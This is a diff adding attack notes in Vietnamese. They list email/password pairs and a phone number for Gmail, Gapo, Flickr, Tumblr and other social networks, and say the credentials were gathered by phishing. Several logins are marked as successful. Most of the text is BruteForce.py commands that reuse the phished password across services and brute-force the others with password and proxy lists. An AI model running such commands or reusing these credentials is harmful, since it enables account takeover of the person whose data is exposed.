@@ -1,0 +1,59 @@
+gmail pk4824829@gmail.com Abcdef@123456
+
+gapo 0373926165 P@ssWord123
+biztime pk4824829@gmail.com Abcdefg@1234567
+hahalolo pk4824829@gmail.com 123456@Abcdef
+befilo pk4824829@gmail.com edcba@54321
+desentric pk4824829@gmail.com Abcde@12345
+flickr pk4824829@gmail.com Abcdef@123456         -check pass success
+tumblr pk4824829@gmail.com Abcdef@123456         -check pass success
+zoimas pk4824829@gmail.com Abcdef@123456         -check pass success
+
+
+
+
+
+
+Thực hiện truy cập đến thư mục chwas code
+cd Python/Social_Media_Attack
+
+Thực hiện dùng finder để tìm kiếm các mạng xã hội mà gmail pk4824829@gmail.com đãng ký
+python BruteForce.py -% pk4824829@gmail.com
+
+Thực hiện get proxy
+python BruteForce.py -> proxy_list.txt
+
+Thực hiện đăng nhập tài khoản thu thập được từ phishing là pk4824829@gmail.com Abcdef@123456
+python BruteForce.py -! pk4824829@gmail.com -$ Abcdef@123456
+
+Tha thấy Flickr, Tumblr, Zoimas đều sử dụng password Abcdef@123456
+
+Tiếp tục BruteForce Gapo
+python BruteForce.py -G 0373926165 -# password_list.txt -< proxy_list.txt         -------------
+python BruteForce.py -b pk4824829@gmail.com -# password_list.txt -< proxy_list.txt
+python BruteForce.py -H pk4824829@gmail.com -# password_list.txt -< proxy_list.txt      -
+python BruteForce.py -F pk4824829@gmail.com -# password_list.txt -< proxy_list.txt        -
+python BruteForce.py -Z pk4824829@gmail.com -# password_list.txt -< proxy_list.txt
+python BruteForce.py -B pk4824829@gmail.com -# password_list.txt -< proxy_list.txt
+python BruteForce.py -D pk4824829@gmail.com -# password_list.txt -< proxy_list.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
